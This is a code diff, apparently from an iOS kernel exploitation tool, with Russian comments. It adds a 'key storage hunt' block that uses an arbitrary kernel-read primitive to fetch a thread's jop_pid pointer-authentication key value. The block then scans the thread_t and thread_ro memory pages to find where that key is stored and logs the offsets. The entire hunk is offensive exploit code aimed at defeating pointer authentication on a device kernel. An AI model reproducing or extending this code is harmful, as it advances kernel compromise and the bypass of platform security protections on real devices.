@@ -5153,6 +5153,27 @@ static void *kpParkWorker(void *arg)
                 }
             }
         }
+
+        // --- key storage hunt: где РЕАЛЬНО лежит jop_pid? ---
+        {
+            pacnote(@"--- key storage hunt ---");
+            uint64_t jop = kp_rc_kread64(threadVA + 0x1B8);
+            uint64_t ftbl = [self frameTableVAWithLog:r];
+            int tThread = kpVAType(threadVA, ftbl);
+            int tTro = kpVAType(tro, ftbl);
+            pacnote([NSString stringWithFormat:@"  jop_pid=%#llx · frame types: thread_t=0x%x thread_ro=0x%x (0x21=heap RW, 0x18=ROZONE)", (unsigned long long)jop, tThread, tTro]);
+            // постраничный скан (16K страница зоны всегда замаплена целиком)
+            NSMutableString *hits = [NSMutableString stringWithString:@"  jop_pid найден:"];
+            int nh = 0;
+            uint64_t pgT = threadVA & ~0x3FFFULL;
+            for (uint64_t a = pgT; a < pgT + 0x4000 && nh < 10; a += 8)
+                if (kp_rc_kread64(a) == jop) { [hits appendFormat:@" thread%+#llx", a - threadVA]; nh++; }
+            uint64_t pgR = tro & ~0x3FFFULL;
+            for (uint64_t a = pgR; a < pgR + 0x4000 && nh < 20; a += 8)
+                if (kp_rc_kread64(a) == jop) { [hits appendFormat:@" tro%+#llx", a - tro]; nh++; }
+            if (!nh) [hits appendString:@" НИГДЕ в страницах thread_t/thread_ro"];
+            pacnote(hits);
+        }
     }
     return r;
 }
